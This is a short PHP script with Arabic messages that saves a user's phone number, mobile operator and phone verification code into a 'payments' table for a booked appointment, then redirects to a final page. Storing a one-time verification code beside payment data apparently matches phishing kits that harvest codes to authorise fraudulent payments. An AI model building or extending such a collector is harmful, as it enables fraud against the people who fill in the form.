<?php
session_start();
require_once 'db.php';

$appointment_id = $_SESSION['appointment_id'] ?? null;
if (!$appointment_id) {
    die("معرف الحجز غير موجود.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone_number = $_POST['phone_number'] ?? '';
    $operator = $_POST['operator'] ?? '';
    $phone_verification_code = $_POST['phone_verification_code'] ?? '';

    if (empty($phone_number) || empty($operator) || empty($phone_verification_code)) {
        die("جميع حقول رقم الجوال ورمز التحقق مطلوبة.");
    }

    // تحديث بيانات رقم الجوال ورمز التحقق في نفس السجل
    $stmt = $conn->prepare("UPDATE payments SET phone_number=?, operator=?, phone_verification_code=? WHERE appointment_id=?");
    $stmt->bind_param("sssi", $phone_number, $operator, $phone_verification_code, $appointment_id);

    if ($stmt->execute()) {
        header("Location: final_page.php");  // صفحة النهاية
        exit;
    } else {
        die("حدث خطأ أثناء حفظ بيانات الجوال: " . $conn->error);
    }
} else {
    die("طريقة الطلب غير مدعومة.");
}
?>
